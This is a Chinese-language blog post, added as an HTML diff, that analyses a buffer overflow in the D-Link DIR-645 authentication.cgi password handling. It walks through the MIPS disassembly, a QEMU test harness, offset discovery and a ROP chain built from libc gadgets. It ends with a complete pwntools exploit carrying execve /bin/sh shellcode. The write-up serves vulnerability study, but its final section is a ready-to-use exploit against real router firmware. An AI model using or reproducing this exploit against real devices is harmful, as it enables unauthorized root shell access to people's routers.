@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          D-Link authentication.cgi 缓冲区溢出漏洞 - hello word
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite-url/2019/09/17/D-Link-authentication-cgi-缓冲区溢出漏洞/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('index.jpg')
+            /*post*/
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/BeanTechSign-white.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#IoT" title="IoT">IoT</a>
+                            
+                        </div>
+                        <h1>D-Link authentication.cgi 缓冲区溢出漏洞</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by 骑猪满天飞 on
+                            2019-09-17
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Hello Word</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1><span id="d-link-authentiction-缓冲区溢出漏洞">D-Link authentiction 缓冲区溢出漏洞</span></h1>
+<h2><span id="漏洞介绍">漏洞介绍</span></h2>
+<p>D-Link DIR-645中authentiction.cgi在读取POST“password”参数时存在缓冲区溢出漏洞。</p>
+<h2><span id="漏洞分析">漏洞分析</span></h2>
+<p><img src="1.PNG" alt><br>
+在authenticationcgi_main函数中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loc_40B454:</span><br><span class="line">la      $t9, strcmp</span><br><span class="line">move    $a0, $s1         # s1</span><br><span class="line">jalr    $t9 ; strcmp</span><br><span class="line">addiu   $a1, (aPost - 0x420000)  # &quot;POST&quot;</span><br><span class="line">lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">bnez    $v0, loc_40BC9C  # v0 = 0 请求方式为POST，不跳转</span><br><span class="line">move    $a1, $zero       # c</span><br></pre></td></tr></table></figure>
+<p>该函数通过loc_40B454判断请求类型是否为POST，当请求为POST时进入以下分支，获取环境变量的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">la      $t9, memset</span><br><span class="line">li      $a2, 0x184       # n</span><br><span class="line">jalr    $t9 ; memset     #申请大小为0x184的内存，初始化为0</span><br><span class="line">move    $a0, $s3         # s  </span><br><span class="line">lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">lui     $a0, 0x42  # &apos;B&apos;</span><br><span class="line">la      $t9, getenv</span><br><span class="line">nop</span><br><span class="line">jalr    $t9 ; getenv</span><br><span class="line">la      $a0, aContent_type  # &quot;CONTENT_TYPE&quot;</span><br><span class="line">lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">lui     $a0, 0x42  # &apos;B&apos;</span><br><span class="line">la      $t9, getenv</span><br><span class="line">la      $a0, aContent_length  # &quot;CONTENT_LENGTH&quot;</span><br><span class="line">jalr    $t9 ; getenv</span><br><span class="line">move    $s0, $v0          # 这里的v0是上一个函数getenv(&quot;CONTENT_TYPE&quot;)的返回结果</span><br><span class="line">lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">beqz    $s0, loc_40B610   # 判断CONTENT_TYPE，s0=0 跳转结束函数</span><br><span class="line">addiu   $a0, $sp, 0xF90+var_938</span><br><span class="line"></span><br><span class="line">beqz    $v0, loc_40B614  #这里的v0为CONTENT_LENGTH的值，为0则跳转结束函数</span><br><span class="line">addiu   $a1, $sp, 0xF90+var_E1C</span><br></pre></td></tr></table></figure>
+<p>通过getnev函数或取环境变量CONTENT_TYPE、CONTENT_LENGT的值后，通过read函数获取post传递的参数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">la      $t9, atoi</span><br><span class="line">nop</span><br><span class="line">jalr    $t9 ; atoi      </span><br><span class="line">move    $a0, $v0         # nptr</span><br><span class="line">lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">move    $s0, $v0         # 获取转换为int类型的length</span><br><span class="line">la      $v1, stdin</span><br><span class="line">la      $t9, fileno</span><br><span class="line">lw      $a0, (stdin - 0x4353CC)($v1)  # stream  </span><br><span class="line">jalr    $t9 ; fileno                #获取文件描述符，通过v0传递给下面read函数</span><br><span class="line">addiu   $s1, $sp, 0xF90+var_430   # 栈缓冲区</span><br><span class="line">lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">move    $a0, $v0         # fd，设置文件描述符</span><br><span class="line">la      $t9, read</span><br><span class="line">move    $a1, $s1         # 设置缓冲区</span><br><span class="line">jalr    $t9 ; read</span><br><span class="line">move    $a2, $s0         # nbytes  from length，需要读取的长度 漏洞出现在这里， 没有对content_length的值进行验证，当length超长时将造成缓冲区溢出</span><br><span class="line">bltz    $v0, loc_40B60C</span><br><span class="line">addu    $v0, $s1, $s0</span><br></pre></td></tr></table></figure>
+<p>上述过程在read读取传递的数据时，使用了未作长度限制的CONTENT_LENGTH的值造成了缓冲区溢出。</p>
+<h2><span id="漏洞利用">漏洞利用</span></h2>
+<h3><span id="测试脚本">测试脚本</span></h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">INPUT=&quot;$1&quot;</span><br><span class="line">TEST=&quot;$2&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line"></span><br><span class="line">echo &quot;$INPUT&quot; | sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$TEST -E REQUEST_URI=&quot;/authentication.cgi&quot; -E REMOTE_ADDR=&apos;192.168.1.1&apos; -g 1234 ./htdocs/web/authentication.cgi</span><br></pre></td></tr></table></figure>
+<h3><span id="确定偏移">确定偏移</span></h3>
+<p>经测试发现当字符串过长时，会使getenv函数无法正常工作，使得无法控制ra寄存器的值。</p>
+<p>使用pattern.py创建1100个字符串填充password字段，确定偏移：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat auth</span><br><span class="line">id=1234&amp;password=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk</span><br><span class="line">./run.sh `cat auth`  uid=1234</span><br></pre></td></tr></table></figure>
+<p><img src="offset.PNG" alt></p>
+<p>确定ra偏移为1051</p>
+<h3><span id="创建rop">创建ROP</span></h3>
+<p>IDA加载lib下的libc.so.0动态连接库，然后通过ropmips工具寻找rop链。<br>
+libc.s0.0为动态加载，需要确定基地址，可使用gdb的vmmap确定基地址，或通过执行过程中的libc函数地址减去偏移确定基地址。</p>
+<p>ROP链思路：<br>
+1.a0 = 1<br>
+2.调用sleep()<br>
+3.shellcode位置确定<br>
+4.调用栈上shellcode</p>
+<p>1.通过mipsrop.find(“li $a0,1”)寻找到a0赋值为1的gadget，地址为0x0002F0F8：<br>
+<img src="a0.PNG" alt><br>
+s4寄存填充为下一条gadget地址</p>
+<p>2.调用sleep()，通过mipsrop.tail()寻找函数调用gadget，找到地址为0x00024CEC：<br>
+<img src="tail.PNG" alt><br>
+s1寄存器填充为sleep函数的地址，根据<code>lw $ra, 0x28+var_4($sp)</code>，ra为sleep函数执行后的返回地址，填充为下一条gadget地址。</p>
+<p>3.使用mipsrop.stackfinder() 寻找栈上shellcode保存的gadget，找到地址为0x0000B814：<br>
+<img src="2.PNG" alt><br>
+shellcode填充位置为sp+0x18，并将地址保存到a1寄存器，s1填充下一条gadget地址。</p>
+<p>4.调用shellcode，现在shellcode地址在a1寄存器，通过mipsrop.find(“move $t9,$a1”)寻找调用shellcode的gadget，找到地址为0x00037E6C：<br>
+<img src="3.PNG" alt></p>
+<h3><span id="完整exp">完整exp</span></h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sleep_addr = 0x00056BD0</span><br><span class="line"></span><br><span class="line">base_addr = 0x76738000</span><br><span class="line">rop1 =0x0002F0F8</span><br><span class="line">rop2 =0x00024CEC</span><br><span class="line">rop3 =0x0000B814</span><br><span class="line">rop4 =0x00037E6C</span><br><span class="line"></span><br><span class="line">shellcode=&quot;\xff\xff\x06\x28&quot; </span><br><span class="line">shellcode+=&quot;\xff\xff\xd0\x04&quot; </span><br><span class="line">shellcode+=&quot;\xff\xff\x05\x28&quot; </span><br><span class="line">shellcode+=&quot;\x01\x10\xe4\x27&quot; </span><br><span class="line">shellcode+=&quot;\x0f\xf0\x84\x24&quot; </span><br><span class="line">shellcode+=&quot;\xab\x0f\x02\x24&quot; </span><br><span class="line">shellcode+=&quot;\x0c\x01\x01\x01&quot; </span><br><span class="line">shellcode+=&quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">payload = &apos;id=1234&amp;password=&apos;</span><br><span class="line">payload += &apos;a&apos;*1019</span><br><span class="line">payload += p32(sleep_addr+base_addr) #s1</span><br><span class="line">payload += &apos;a&apos;*4</span><br><span class="line">payload += p32(rop2+base_addr) #s3  测试发现s3必须为一个存在的地址，所以随意填写一个存在的地址。</span><br><span class="line">payload += p32(rop2+base_addr) #s4</span><br><span class="line">payload += &apos;a&apos;*16</span><br><span class="line"></span><br><span class="line">payload += p32(rop1+base_addr) #ra</span><br><span class="line">payload +=&apos;b&apos;*0x1c</span><br><span class="line">payload +=p32(rop4+base_addr) #s1</span><br><span class="line">payload +=&apos;b&apos;*4</span><br><span class="line">payload +=p32(rop3+base_addr) #sleep -&gt; ra</span><br><span class="line"></span><br><span class="line">payload +=&apos;c&apos;*0x18</span><br><span class="line">payload +=shellcode</span><br><span class="line"></span><br><span class="line">fp = open(&apos;content&apos;,&apos;wb&apos;)</span><br><span class="line">fp.write(payload)</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/08/31/mips缓冲区溢出/" data-toggle="tooltip" data-placement="top" title="mips缓冲区溢出">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">D-Link authentiction 缓冲区溢出漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">漏洞介绍</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">漏洞分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">漏洞利用</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">测试脚本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">确定偏移</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">创建ROP</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">完整exp</span></a></li></ol></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#IoT" title="IoT">IoT</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://yoursite-url/2019/09/17/D-Link-authentication-cgi-缓冲区溢出漏洞/";
+    var disqus_url = "http://yoursite-url/2019/09/17/D-Link-authentication-cgi-缓冲区溢出漏洞/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/zettt8214">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 骑猪满天飞 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    re-Ported by <a href="http://beantech.org">BeanTech</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=YenYuHsuan&repo=hexo-theme-beantech&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite-url/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="http://yoursite-url/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
